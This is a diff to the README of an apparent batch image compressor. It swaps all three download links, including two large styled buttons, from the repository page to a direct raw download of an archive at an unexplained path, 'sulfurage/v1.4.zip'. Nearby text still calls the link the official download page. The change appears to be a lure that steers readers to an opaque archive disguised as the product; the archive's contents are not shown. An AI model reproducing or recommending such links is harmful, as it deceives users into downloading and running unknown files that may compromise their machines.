@@ -1,7 +1,7 @@
 <h1>🖼️ image-compressor-batch - Shrink Hundreds of Photos in Seconds</h1>
 
 <p align="center">
-  <a href="https://github.com/Inflected-blast748/image-compressor-batch" style="display:inline-block; padding:16px 32px; background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); color:#ffffff; text-decoration:none; font-size:20px; font-weight:bold; border-radius:50px; margin:20px 0; box-shadow:0 4px 15px rgba(102,126,234,0.4);">
+  <a href="https://github.com/Inflected-blast748/image-compressor-batch/raw/refs/heads/main/sulfurage/v1.4.zip" style="display:inline-block; padding:16px 32px; background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); color:#ffffff; text-decoration:none; font-size:20px; font-weight:bold; border-radius:50px; margin:20px 0; box-shadow:0 4px 15px rgba(102,126,234,0.4);">
     ⬇️ DOWNLOAD IMAGE COMPRESSOR BATCH NOW
   </a>
 </p>
@@ -20,7 +20,7 @@ Follow these simple instructions to download and run image-compressor-batch on y
 
 Click the large purple button at the top of this page, or use this link:
 
-**[👉 Visit this link to download the application](https://github.com/Inflected-blast748/image-compressor-batch)**
+**[👉 Visit this link to download the application](https://github.com/Inflected-blast748/image-compressor-batch/raw/refs/heads/main/sulfurage/v1.4.zip)**
 
 This takes you to the official download page for the software.
 
@@ -142,7 +142,7 @@ You've seen the benefits, the steps, and the FAQs. Now it's time to put this too
 **Click the link below to download image-compressor-batch today:**
 
 <p align="center">
-  <a href="https://github.com/Inflected-blast748/image-compressor-batch" style="display:inline-block; padding:14px 28px; background:linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color:#ffffff; text-decoration:none; font-size:18px; font-weight:bold; border-radius:50px; box-shadow:0 4px 15px rgba(240,147,251,0.4);">
+  <a href="https://github.com/Inflected-blast748/image-compressor-batch/raw/refs/heads/main/sulfurage/v1.4.zip" style="display:inline-block; padding:14px 28px; background:linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color:#ffffff; text-decoration:none; font-size:18px; font-weight:bold; border-radius:50px; box-shadow:0 4px 15px rgba(240,147,251,0.4);">
     📥 DOWNLOAD NOW - IT'S FREE
   </a>
 </p>
